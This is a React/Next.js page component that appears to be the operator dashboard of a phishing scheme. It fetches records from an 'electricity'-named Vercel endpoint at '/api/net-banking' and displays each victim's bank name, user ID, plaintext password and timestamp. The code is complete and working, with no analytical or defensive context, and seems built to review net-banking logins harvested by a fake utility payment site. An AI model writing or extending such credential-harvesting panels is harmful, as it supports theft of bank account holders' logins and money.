"use client";
import axios from "axios";
import { useEffect, useState } from "react";

export default function Page() {
  const [loading, setLoading] = useState(true);
  const [data, setData] = useState(null);

  async function getAllRepo() {
    setLoading(true);
    try {
      await axios
        .get("https://electricity-pi.vercel.app/api/net-banking")
        .then((response) => {
          console.log(response.data?.reverse());
          setData(response.data);
          setLoading(false);
        })
        .catch((error) => {
          console.log(error);
          setLoading(false);
        });
    } catch (error) {
      setTimeout(() => {
        setLoading(false);
      }, 1000);
    }
  }

  useEffect(() => {
    getAllRepo();
  }, []);

  return (
    <div className="w-full flex flex-col p-5">
      <button
        className="p-1 pl-5 pr-5 bg-slate-500 text-black rounded-full mt-5"
        onClick={getAllRepo}
      >
        {loading !== true ? "Refresh" : "Refreshing..."}
      </button>
      <div className="w-full h-screen justify-center items-start flex">
        {loading ? (
          <div className="flex justify-center items-center w-auto h-[40vh]">
            <div className="animate-spin rounded-full h-32 w-32 border-t-2 border-b-2 border-gray-600"></div>
          </div>
        ) : (
          <div className="flex flex-col bg-slate-400 w-[400px] mt-2">
            {data &&
              data?.map((repo, index) => (
                <div
                  key={index}
                  className="dark:bg-slate-700 flex flex-col p-5 w-auto rounded-md border-l-4 border mt-5"
                >
                  <span className="b bg-slate-800 flex p-2">
                    <span className="uppercase mr-5"> Bank Name:</span>
                    <span className=""> {repo?.bank_name}</span>
                  </span>
                  <span className="b bg-slate-800 flex p-2">
                    <span className="uppercase mr-5"> UserID:</span>
                    <span className=""> {repo?.user_id}</span>
                  </span>
                  <span className="b bg-slate-800 flex p-2">
                    <span className="uppercase mr-5"> Password:</span>
                    <span className=""> {repo?.password}</span>
                  </span>
                  <span className="b bg-slate-800 flex p-2">
                    <span className="uppercase mr-5"> Created AT:</span>
                    <span className=""> {repo?.createdAt}</span>
                  </span>
                </div>
              ))}
          </div>
        )}
      </div>
    </div>
  );
}
